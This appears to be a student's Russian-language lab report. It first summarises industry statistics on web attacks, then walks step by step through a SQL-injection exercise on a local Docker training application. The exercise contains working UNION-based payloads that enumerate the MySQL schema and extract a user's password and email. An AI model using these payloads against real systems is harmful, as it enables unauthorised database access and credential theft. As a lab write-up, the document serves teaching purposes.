@@ -1,0 +1,181 @@
+<h1 id="лабораторная-работа-1">Лабораторная работа №1</h1>
+<h2 id="часть-i">Часть I</h2>
+<h3 id="positive-technologies">1. Positive Technologies</h3>
+<h4 id="ссылка-на-источник">1.1 <a
+href="https://ptsecurity.com/research/analytics/russia-cyberthreat-landscape-2026/#id2">Ссылка
+на источник</a></h4>
+<h4 id="доля-успешных-атак">1.2 Доля успешных атак</h4>
+<p>32% от всех атак на организации начинаются с эксплуатации уязвимостей
+в веб-ресурсах на периметре. В атаках на госучреждения этот показатель
+достигает 36%.</p>
+<figure>
+<img src="image-15.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<h4 id="распределение-по-уязвимостям">1.3 Распределение по
+уязвимостям:</h4>
+<ul>
+<li><p>Недостатки контроля доступа (Broken Access Control) —
+26%</p></li>
+<li><p>Инъекции (включая SQLi, Command Injection) — 19%</p></li>
+<li><p>Межсайтовый скриптинг (XSS) — 14%</p></li>
+<li><p>Использование компонентов с известными уязвимостями —
+12%</p></li>
+</ul>
+<h4 id="scope">1.4 Scope</h4>
+<p>Организации в России и СНГ (госсектор, промышленность, финансы).</p>
+<h3 id="rostelecom-solar">2. Rostelecom-Solar</h3>
+<h4 id="ссылка-на-источник-1">1.1 <a
+href="https://rt-solar.ru/solar-4rays/blog/6142/">Ссылка на
+источник</a></h4>
+<h4 id="доля-успешных-атак-1">1.2 Доля успешных атак</h4>
+<p>Отчет за 3-ий квартал 2025 года Веб-атаки составляют 24% от всех
+критических инцидентов, зафиксированных в коммерческом секторе РФ.</p>
+<h4 id="распределение-по-уязвимостям-1">1.3 Распределение по
+уязвимостям:</h4>
+<ul>
+<li><p>CWE-89: внедрение SQL-кода (SQL-инъекция) — 14%</p></li>
+<li><p>CWE-79: недостаточная нейтрализация ввода при формировании
+веб-страницы (XSS) — 17.8%</p></li>
+<li><p>CWE-434: неограниченная загрузка файлов опасного типа —
+5.8%</p></li>
+<li><p>CWE-639: обход авторизации через управляемый пользователем ключ
+(IDOR) — 5.4%</p></li>
+</ul>
+<figure>
+<img src="image-14.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<h4 id="scope-1">1.4 Scope</h4>
+<p>Российский крупный бизнес и IT-компании.</p>
+<h3 id="verizon-dbir-2025">3. Verizon DBIR 2025</h3>
+<h4 id="ссылка-на-источник-2">1.1 <a
+href="https://www.verizon.com/business/resources/reports/dbir/">Ссылка
+на источник</a></h4>
+<h4 id="доля-успешных-атак-2">1.2 Доля успешных атак</h4>
+<p>Эксплуатация уязвимостей как вектор начального доступа (Initial
+Access) выросла на 34% и достигла 20% от всех взломов.</p>
+<h4 id="распределение-по-уязвимостям-2">1.3 Распределение по
+уязвимостям:</h4>
+<ul>
+<li><p>Exploitation of Vulnerabilities: Рост популярности метода как
+вектора входа составил 34% год к году.</p></li>
+<li><p>SQL-инъекции (SQLi): Несмотря на снижение в общем объеме кода,
+они по-прежнему составляют ~12% от всех критических находок в
+веб-приложениях по данным партнеров (Edgescan).</p></li>
+<li><p>CWE-89 (Improper Neutralization of Special Elements used in an
+SQL Command): Занимает 1-е место по потенциальному ущербу (Impact) среди
+всех типов инъекций.</p></li>
+</ul>
+<h4 id="scope-2">1.4 Scope</h4>
+<p>Глобальный охват. Основной тренд 2025 года</p>
+<h2 id="часть-ii">Часть II</h2>
+<p>Для выполнения запросов воспользуюсь программой
+<code>Postman</code></p>
+<h3 id="запуск-приложения">1. Запуск приложения</h3>
+<p>В директории с <code>docker-compose.yaml</code></p>
+<p>Вводим команду</p>
+<pre><code>docker compose up -d</code></pre>
+<p>В браузере открываем по адресу <code>http://localhost:8080</code>
+<img src="image-2.png" alt="" /></p>
+<p>Далее нажимаем
+<code>Установить/сбросить базу --&gt; Приступить к выполнению заданий</code></p>
+<figure>
+<img src="image-3.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<p>В query-параметр <code>id</code> будем записывать инъекцию</p>
+<h3 id="выясняем-какая-бд">2. Выясняем, какая БД</h3>
+<p>Отправляем запрос с ошибкой в синтаксисе</p>
+<pre><code>http://localhost:8080/task/?id=&#39; OR o=1</code></pre>
+<p>По ответу выясняем, что БД - <code>MySQL</code>.</p>
+<figure>
+<img src="image-5.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<h3 id="находим-схему-бд">3. Находим схему БД</h3>
+<h4 id="найдем-базу">3.1 Найдем базу</h4>
+<p>При помощи <code>Union</code> и <code>select database()</code>
+выясняем базу, к которой есть подключение</p>
+<pre><code>http://localhost:8080/task/?id=&#39; OR 0=1 UNION SELECT database(), null, null -- </code></pre>
+<p><code>0=1</code> - условие, чтобы первый запрос ничего не вернул.</p>
+<p>Подбираем количество null во втором запросе. Пониманием, что первый
+запрос возвращает 3 колонки, чтобы подогнать под <code>Union</code></p>
+<figure>
+<img src="image-6.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<p>При смене колонок, понимаем, что выходные поля - первые две колонки
+соответственно</p>
+<pre><code>http://localhost:8080/task/?id=&#39; OR 0=1 UNION SELECT &#39;addwa&#39;, database(), &#39;dadaa&#39; -- </code></pre>
+<figure>
+<img src="image-7.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<h4 id="таблицы">3.2 Таблицы</h4>
+<p>Для MySQL таблицы разполагаются в таблице</p>
+<p><code>information_schema.tables</code></p>
+<p>При помощи <code>Limit</code> и <code>offset</code> достаем таблицы
+по одной</p>
+<pre><code>http://localhost:8080/task/?id=&#39; OR 0=1 UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET 0 -- </code></pre>
+<figure>
+<img src="image-8.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<pre><code>http://localhost:8080/task/?id=&#39; OR 0=1 UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET 1 -- </code></pre>
+<figure>
+<img src="image-9.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<pre><code>http://localhost:8080/task/?id=&#39; OR 0=1 UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET 2 -- </code></pre>
+<figure>
+<img src="image-10.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<p>Итого: 2 таблицы - <code>users</code> и <code>emails</code></p>
+<h4 id="колонки">3.3 Колонки</h4>
+<p>Информация о колонках таблицы хранится в таблице</p>
+<p><code>information_schema.columns</code> в колонке
+<code>column_name</code></p>
+<pre><code>http://localhost:8080/task/?id=&#39; OR 0=1 UNION SELECT table_name, column_name, null FROM information_schema.columns WHERE table_name = &#39;users&#39; LIMIT 1 OFFSET 0 -- </code></pre>
+<figure>
+<img src="image-11.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<p>Аналогично смещая <code>offset</code> находим колонки для обеих
+таблиц</p>
+<ol type="1">
+<li>users
+<ul>
+<li>USER - метаинформация</li>
+<li>CURRENT_CONNECTIONS - метаинформация</li>
+<li>TOTAL_CONNECTIONS - метаинформация</li>
+<li>id</li>
+<li>username</li>
+<li>password</li>
+</ul></li>
+<li>emails
+<ul>
+<li>id</li>
+<li>email_id</li>
+</ul></li>
+</ol>
+<h3 id="находим-пароль-пользователя-volk2">4. Находим пароль
+пользователя ‘Volk2’</h3>
+<p>Достаем запросом пароль - <code>Wa spoiuuuuu</code></p>
+<pre><code>http://localhost:8080/task/?id=&#39; OR 0=1 UNION SELECT id, password, null from users where username = &#39;Volk2&#39; -- </code></pre>
+<figure>
+<img src="image-12.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<h3 id="находим-почту">5. Находим почту</h3>
+<p>Джойним две таблицы по айди и получаем почту</p>
+<pre><code>honey_lover@otus-lab.com</code></pre>
+<pre><code>http://localhost:8080/task/?id=&#39; OR 0=1 UNION SELECT 1 as id, email_id as username, null from users join emails on emails.id = users.id where users.username  = &#39;Vinni-pukh&#39; -- </code></pre>
+<figure>
+<img src="image-13.png" alt="" />
+<figcaption aria-hidden="true"></figcaption>
+</figure>
+<!-- <h1 id="бонус">Бонус</h1>
+<p><img src="image.png" alt="" /> <img src="image-1.png"
+alt="" /></p> -->
